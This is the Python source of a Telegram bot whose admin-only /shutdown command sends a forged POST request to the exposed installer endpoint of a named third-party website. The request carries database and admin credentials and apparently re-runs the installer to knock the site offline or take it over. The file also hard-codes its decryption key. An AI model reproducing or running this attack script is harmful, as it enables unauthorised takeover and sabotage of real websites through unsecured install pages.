import os
import requests
import telebot
import logging
from cryptography.fernet import Fernet

# Enable logging
logging.basicConfig(level=logging.INFO)

# Encryption key directly in the code
SECRET_KEY = b"IGbmVSCkaa2OTD06SEFNM-MZocYnQ1t9To_8pxHYEV0="

# Decrypt and load environment variables into memory
def decrypt_env():
    """Decrypt the .env.enc file and load environment variables without writing to disk."""
    try:
        fernet = Fernet(SECRET_KEY)

        # Read encrypted .env file
        with open(".env.enc", "rb") as encrypted_file:
            encrypted_data = encrypted_file.read()

        # Decrypt data
        decrypted_data = fernet.decrypt(encrypted_data).decode()

        # Parse decrypted data and load into environment variables
        for line in decrypted_data.splitlines():
            if line.strip() and "=" in line:  # Ensure it's a valid key=value pair
                key, value = line.split("=", 1)
                os.environ[key.strip()] = value.strip()

        logging.info("✅ Environment variables loaded securely in memory.")

    except Exception as e:
        logging.error(f"❌ Failed to decrypt .env file: {e}")
        raise

# Decrypt and load environment variables
decrypt_env()

# Get environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

# Validate BOT_TOKEN and ADMIN_ID
if not BOT_TOKEN or not ADMIN_ID:
    logging.error("BOT_TOKEN or ADMIN_ID is missing in environment variables.")
    raise ValueError("BOT_TOKEN or ADMIN_ID is missing. Check your encrypted .env file.")

if not ADMIN_ID.isdigit():
    logging.error("ADMIN_ID should be a numeric Telegram user ID.")
    raise ValueError("ADMIN_ID must be a valid numeric Telegram user ID.")

# Initialize the Telegram bot
try:
    bot = telebot.TeleBot(BOT_TOKEN)
except Exception as e:
    logging.error(f"Failed to initialize the bot: {e}")
    raise

def shutdown():
    """Execute the shutdown command."""
    url = "https://moneymanafrica.org/install/?action=complete"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://moneymanafrica.org",
        "Referer": "https://moneymanafrica.org/install/?action=info"
    }
    data = {
        "url": "https://moneymanafrica.org",
        "user": os.getenv("SHUTDOWN_USER", "default_user"),
        "code": os.getenv("SHUTDOWN_CODE", "default_code"),
        "db_name": os.getenv("DB_NAME", "default_db"),
        "db_host": os.getenv("DB_HOST", "default_host"),
        "db_user": os.getenv("DB_USER", "default_db_user"),
        "db_pass": os.getenv("DB_PASS", "default_db_pass"),
        "email": os.getenv("ADMIN_EMAIL", "admin@example.com")
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        response.raise_for_status()
        logging.info("Shutdown command executed successfully.")
        return "Shutdown executed successfully."
    
    except requests.exceptions.RequestException:
        return "Shutdown failed: webiste is already down."

@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle the /start command."""
    bot.reply_to(message, "Welcome! Type /shutdown to execute the shutdown command.")

@bot.message_handler(commands=['shutdown'])
def handle_shutdown(message):
    """Handle the /shutdown command."""
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    result = shutdown()
    bot.reply_to(message, result)

# Start the bot polling
logging.info("Bot is now running...")
bot.polling(none_stop=True)
